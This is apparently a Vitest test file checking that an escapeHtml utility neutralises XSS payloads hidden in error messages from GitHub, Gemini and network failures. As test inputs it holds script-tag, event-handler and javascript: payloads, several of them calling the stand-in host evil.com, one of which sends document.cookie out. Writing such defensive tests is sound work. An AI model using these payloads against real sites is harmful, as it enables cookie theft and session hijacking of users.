/**
 * Error Message XSS Prevention Tests
 *
 * Tests for XSS prevention when displaying error messages from external services.
 * Error messages from APIs (GitHub, Gemini, etc.) could potentially contain
 * malicious content if the service is compromised or returns unexpected data.
 * These tests ensure error messages are properly escaped before display.
 */

import { describe, expect, it } from 'vitest';
import { escapeHtml } from '../src/utils/html';

describe('Error Message XSS Prevention', () => {
  describe('GitHub API error messages', () => {
    it('escapes script tags in error messages', () => {
      const maliciousError = '<script>alert("xss")</script>Invalid token';
      const escaped = escapeHtml(maliciousError);

      expect(escaped).not.toContain('<script>');
      expect(escaped).toContain('&lt;script&gt;');
      expect(escaped).toContain('Invalid token');
    });

    it('escapes event handlers in error messages', () => {
      const maliciousError = '<img src=x onerror="document.location=\'http://evil.com\'">Bad request';
      const escaped = escapeHtml(maliciousError);

      expect(escaped).not.toContain('<img');
      // The text 'onerror' is still present but harmless since the tag is escaped
      expect(escaped).toContain('&lt;img');
      expect(escaped).toContain('onerror'); // Present as text, not as attribute
    });

    it('escapes HTML in JSON-like error responses', () => {
      const maliciousError = '{"message":"<script>alert(1)</script>","documentation_url":"https://docs.github.com"}';
      const escaped = escapeHtml(maliciousError);

      expect(escaped).not.toContain('<script>');
      expect(escaped).toContain('&lt;script&gt;');
    });

    it('escapes quotes that could break out of HTML attributes', () => {
      const maliciousError = '" onclick="alert(1)" data-x="';
      const escaped = escapeHtml(maliciousError);

      expect(escaped).toContain('&quot;');
      expect(escaped).not.toContain('" onclick');
    });
  });

  describe('Gemini API error messages', () => {
    it('escapes HTML in API error responses', () => {
      const maliciousError = '<div onmouseover="alert(1)">Invalid API key</div>';
      const escaped = escapeHtml(maliciousError);

      expect(escaped).not.toContain('<div');
      // The text 'onmouseover' is still present but harmless since the tag is escaped
      expect(escaped).toContain('&lt;div');
      expect(escaped).toContain('Invalid API key');
    });

    it('escapes SVG-based XSS attempts', () => {
      const maliciousError = '<svg onload="alert(1)">Error occurred</svg>';
      const escaped = escapeHtml(maliciousError);

      expect(escaped).not.toContain('<svg');
      expect(escaped).toContain('&lt;svg');
    });

    it('escapes javascript: protocol in error messages', () => {
      const maliciousError = '<a href="javascript:alert(1)">Click for help</a>';
      const escaped = escapeHtml(maliciousError);

      expect(escaped).not.toContain('<a');
      expect(escaped).toContain('&lt;a');
    });
  });

  describe('Function plot rendering error messages', () => {
    it('escapes HTML in JSON parse errors', () => {
      const maliciousError = 'Unexpected token < in JSON at position 0 <script>alert(1)</script>';
      const escaped = escapeHtml(maliciousError);

      expect(escaped).not.toContain('<script>');
      expect(escaped).toContain('&lt;script&gt;');
    });

    it('escapes HTML in base64 decode errors', () => {
      const maliciousError = 'Invalid character <img onerror=alert(1)> in base64 string';
      const escaped = escapeHtml(maliciousError);

      expect(escaped).not.toContain('<img');
      expect(escaped).toContain('&lt;img');
    });

    it('escapes HTML entities that are already escaped', () => {
      // Double-escaping test: ensure already-escaped content doesn't become executable
      const alreadyEscaped = '&lt;script&gt;alert(1)&lt;/script&gt;';
      const escaped = escapeHtml(alreadyEscaped);

      expect(escaped).toBe('&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;');
    });
  });

  describe('generic network error messages', () => {
    it('escapes HTML in timeout errors', () => {
      const maliciousError = 'Request timed out <script>fetch("http://evil.com?c="+document.cookie)</script>';
      const escaped = escapeHtml(maliciousError);

      expect(escaped).not.toContain('<script>');
      expect(escaped).toContain('&lt;script&gt;');
    });

    it('escapes HTML in connection refused errors', () => {
      const maliciousError = 'Connection refused <iframe src="javascript:alert(1)">';
      const escaped = escapeHtml(maliciousError);

      expect(escaped).not.toContain('<iframe');
      expect(escaped).toContain('&lt;iframe');
    });

    it('escapes HTML in DNS resolution errors', () => {
      const maliciousError = 'DNS resolution failed for <b onmouseover="alert(1)">evil.com</b>';
      const escaped = escapeHtml(maliciousError);

      expect(escaped).not.toContain('<b');
      expect(escaped).toContain('&lt;b');
    });
  });

  describe('edge cases in error messages', () => {
    it('handles empty error messages', () => {
      const escaped = escapeHtml('');
      expect(escaped).toBe('');
    });

    it('handles error messages with only special characters', () => {
      const specialChars = '<>&"\'';
      const escaped = escapeHtml(specialChars);

      expect(escaped).toBe('&lt;&gt;&amp;&quot;&#39;');
    });

    it('handles very long error messages', () => {
      const longError = '<script>'.repeat(10000) + 'Error' + '</script>'.repeat(10000);
      const escaped = escapeHtml(longError);

      expect(escaped).not.toContain('<script>');
      expect(escaped).toContain('Error');
    });

    it('handles unicode in error messages', () => {
      const unicodeError = '<script>alert("🔥 XSS 🔥")</script>';
      const escaped = escapeHtml(unicodeError);

      expect(escaped).not.toContain('<script>');
      expect(escaped).toContain('🔥');
    });

    it('handles newlines and tabs in error messages', () => {
      const multilineError = '<script>\nalert(1)\n</script>';
      const escaped = escapeHtml(multilineError);

      expect(escaped).not.toContain('<script>');
      expect(escaped).toContain('\n');
    });

    it('handles null bytes in error messages', () => {
      const nullByteError = '<scr\x00ipt>alert(1)</script>';
      const escaped = escapeHtml(nullByteError);

      expect(escaped).not.toContain('<scr');
    });
  });

  describe('real-world error message patterns', () => {
    it('escapes GitHub rate limit error', () => {
      const rateLimitError = 'API rate limit exceeded for user. <a href="https://docs.github.com/rest">Learn more</a>';
      const escaped = escapeHtml(rateLimitError);

      expect(escaped).not.toContain('<a');
      expect(escaped).toContain('API rate limit exceeded');
    });

    it('escapes Gemini quota exceeded error', () => {
      const quotaError = 'Quota exceeded <span style="color:red" onclick="alert(1)">Click to upgrade</span>';
      const escaped = escapeHtml(quotaError);

      expect(escaped).not.toContain('<span');
      // The text 'onclick' is still present but harmless since the tag is escaped
      expect(escaped).toContain('&lt;span');
      expect(escaped).toContain('Quota exceeded');
    });

    it('escapes fetch network error', () => {
      const fetchError = 'Failed to fetch: <img src="http://evil.com/track?error=1">';
      const escaped = escapeHtml(fetchError);

      expect(escaped).not.toContain('<img');
      expect(escaped).toContain('Failed to fetch');
    });

    it('escapes CORS error', () => {
      const corsError = 'CORS policy blocked: <script>window.location="http://evil.com"</script>';
      const escaped = escapeHtml(corsError);

      expect(escaped).not.toContain('<script>');
      expect(escaped).toContain('CORS policy blocked');
    });
  });
});

describe('Error message display integration', () => {
  describe('settings page error display pattern', () => {
    it('correctly escapes error message when building innerHTML', () => {
      const errorMessage = '<script>alert("xss")</script>';
      const iconHtml = '<svg>...</svg>'; // Icons are trusted internal content

      // This pattern matches how settings.ts displays errors
      const displayHtml = `${iconHtml} Error: ` + escapeHtml(errorMessage);

      expect(displayHtml).toContain('<svg>'); // Icon should remain unescaped
      expect(displayHtml).not.toContain('<script>'); // Error should be escaped
      expect(displayHtml).toContain('&lt;script&gt;');
    });

    it('handles "Unknown error" fallback safely', () => {
      const unknownError = 'Unknown error';
      const escaped = escapeHtml(unknownError);

      expect(escaped).toBe('Unknown error');
    });

    it('handles "Invalid key" fallback safely', () => {
      const invalidKey = 'Invalid key';
      const escaped = escapeHtml(invalidKey);

      expect(escaped).toBe('Invalid key');
    });
  });

  describe('markdown function plot error display pattern', () => {
    it('correctly escapes error message in plot error div', () => {
      const errorMessage = '<script>alert("xss")</script>';

      // This pattern matches how markdown.ts displays plot errors
      const displayHtml = `<div class="plot-error">Error rendering plot: ${escapeHtml(errorMessage)}</div>`;

      expect(displayHtml).toContain('class="plot-error"');
      expect(displayHtml).not.toContain('<script>alert');
      expect(displayHtml).toContain('&lt;script&gt;');
    });

    it('preserves error message readability while escaping', () => {
      const errorMessage = 'Invalid JSON: unexpected token at position 5';
      const displayHtml = `<div class="plot-error">Error rendering plot: ${escapeHtml(errorMessage)}</div>`;

      expect(displayHtml).toContain('Invalid JSON: unexpected token at position 5');
    });
  });
});
